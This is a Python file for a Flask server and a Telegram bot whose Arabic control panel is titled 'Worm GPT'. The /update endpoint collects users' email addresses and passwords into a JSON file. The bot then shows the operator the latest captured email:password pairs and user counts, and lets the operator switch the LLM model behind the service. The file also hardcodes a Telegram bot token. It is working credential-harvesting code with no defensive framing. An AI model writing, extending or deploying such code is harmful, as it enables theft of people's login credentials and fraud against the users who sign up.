import json, os, threading, asyncio
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

BOT_TOKEN = "8884649220:AAHmfIi06z8E8kvUWwxpVq4kViIaOvnnmd0"
DEVELOPER_CHAT_ID = 7281360881
DATA_FILE = "bot_data.json"
AVAILABLE_MODELS = [
    "meta-llama/llama-3-70b-instruct",
    "google/gemma-2-9b-it:free",
    "mistralai/mixtral-8x7b-instruct",
    "deepseek/deepseek-chat",
    "meta-llama/llama-3-8b-instruct"
]

def load_data():
    if not os.path.exists(DATA_FILE): return {"emails":[], "current_model":AVAILABLE_MODELS[0], "user_count":0}
    with open(DATA_FILE, "r") as f: return json.load(f)

def save_data(d):
    with open(DATA_FILE, "w") as f: json.dump(d, f)

app = Flask(__name__)

@app.route("/update", methods=["POST"])
def update():
    data = load_data()
    c = request.json or {}
    if "email" in c and "password" in c:
        data["emails"].append({"email":c["email"], "password":c["password"], "timestamp":c.get("timestamp",0)})
        data["emails"] = data["emails"][-10:]
        data["user_count"] += 1
    if "model" in c: data["current_model"] = c["model"]
    save_data(data)
    return jsonify({"status":"ok"})

@app.route("/get_model")
def get_model():
    return jsonify({"model": load_data()["current_model"]})

async def start(update, context):
    kbd = [[InlineKeyboardButton("📧 آخر 3 بريد وكلمة سر", callback_data="last")],
           [InlineKeyboardButton("🧠 الموديل الحالي", callback_data="model")],
           [InlineKeyboardButton("👥 إحصائيات", callback_data="stats")],
           [InlineKeyboardButton("⚙️ تغيير الموديل", callback_data="change")]]
    await update.message.reply_text("🖤 لوحة تحكم Worm GPT", reply_markup=InlineKeyboardMarkup(kbd))

async def buttons(update, context):
    q = update.callback_query
    await q.answer()
    d = load_data()
    if q.data == "last":
        mails = d["emails"][-3:]
        txt = "لا بيانات" if not mails else "\n".join([f"{e['email']} : {e['password']}" for e in reversed(mails)])
        await q.edit_message_text(f"📧 آخر 3:\n{txt}")
    elif q.data == "model":
        await q.edit_message_text(f"🧠 الموديل: {d['current_model']}")
    elif q.data == "stats":
        await q.edit_message_text(f"👥 المسجلين: {d['user_count']}")
    elif q.data == "change":
        kbd = [[InlineKeyboardButton(m.split("/")[-1][:30], callback_data=f"set_{m}")] for m in AVAILABLE_MODELS]
        kbd.append([InlineKeyboardButton("رجوع", callback_data="back")])
        await q.edit_message_text("اختر الموديل:", reply_markup=InlineKeyboardMarkup(kbd))
    elif q.data.startswith("set_"):
        new = q.data[4:]
        d["current_model"] = new
        save_data(d)
        await q.edit_message_text(f"✅ تم التغيير إلى {new}")
    elif q.data == "back":
        kbd = [[InlineKeyboardButton("📧 آخر 3 بريد وكلمة سر", callback_data="last")],
               [InlineKeyboardButton("🧠 الموديل الحالي", callback_data="model")],
               [InlineKeyboardButton("👥 إحصائيات", callback_data="stats")],
               [InlineKeyboardButton("⚙️ تغيير الموديل", callback_data="change")]]
        await q.edit_message_text("القائمة الرئيسية", reply_markup=InlineKeyboardMarkup(kbd))

def run_bot():
    asyncio.run(Application.builder().token(BOT_TOKEN).build().run_polling())

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",5000)))
